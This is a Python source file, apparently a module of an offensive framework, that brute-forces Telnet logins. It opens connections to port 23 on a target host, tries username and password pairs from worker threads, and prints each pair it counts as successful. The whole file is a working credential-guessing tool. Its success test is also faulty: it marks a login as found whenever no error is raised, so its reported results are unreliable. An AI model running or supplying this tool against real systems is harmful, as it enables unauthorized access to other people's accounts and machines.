from jframework.modules.login._bruteforce import _Bruteforce
import sys
import telnetlib

class Telnetbruteforce(_Bruteforce):

    def __init__(self):
        super(Telnetbruteforce, self).__init__()
        self.login_found = 0

    def worker(self, user, password):
        if(self.abortar):
            return
        try:
            tn = telnetlib.Telnet(self.HOST, 23, 1)
            tn.read_until((b"login: " or b"Login: " ))
            tn.write(user.encode("ascii") + b"\n")
            tn.read_until((b"Password: " or b"password: "))
            tn.write(password.encode("ascii") + b"\n")
            tn.write(b"dir\n")
            tn.write(b"exit\n")
            tn.read_all()
            tn.close()
            print("[+] " + str(user) + ":" + str(password) + " >> OK")
            self.login_found += 1
        except Exception as e:
            if (self.verb):
                print("[-] " + str(user) + ":" + str(password) + " >> failed")
            try:
                tn.close()
            except:
                pass

        self.num_threads -= 1
        sys.exit(0)

    def run(self):
        self.login_found = 0
        super(Telnetbruteforce, self).run()
        print("Found", self.login_found, "logins for Telnet")